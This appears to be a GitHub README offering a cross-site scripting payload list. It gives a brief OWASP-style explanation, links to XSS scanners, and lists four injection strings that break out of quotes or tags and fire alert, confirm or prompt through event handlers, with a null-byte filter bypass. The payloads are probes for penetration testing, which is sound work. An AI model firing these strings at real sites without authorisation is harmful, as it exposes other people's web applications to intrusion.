### Cross Site Scripting ( XSS ) Payload List
### Created By Anonre

##### Overview : 

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).

#### XSS Vulneability Scanner Tool's :

* [XSStrike](https://github.com/UltimateHackers/XSStrike)

* [BruteXSS Terminal](https://github.com/shawarkhanethicalhacker/BruteXSS)

* [BruteXSS GUI](https://github.com/rajeshmajumdar/BruteXSS)

* [XSS Scanner Online](http://xss-scanner.com/)

* [XSSer](https://tools.kali.org/web-applications/xsser)

* [xsscrapy](https://github.com/DanMcInerney/xsscrapy)


#### XSS Payload List :

```
---------------------------------------------------------------------------------
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Joel Indra -->
<!--      Linkedin : https://www.linkedin.com/in/joelindra/ -->
<!--        GitHub : https://github.com/anonre/ -->
<!--       Twitter : https://twitter.com/joelindra -->
---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

';alert('xss')//
"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
"><html><select %00 onControl onpointerenter=prompt(domain) hello>
"><input %00 onControl hello oninput=confirm(domain) x>
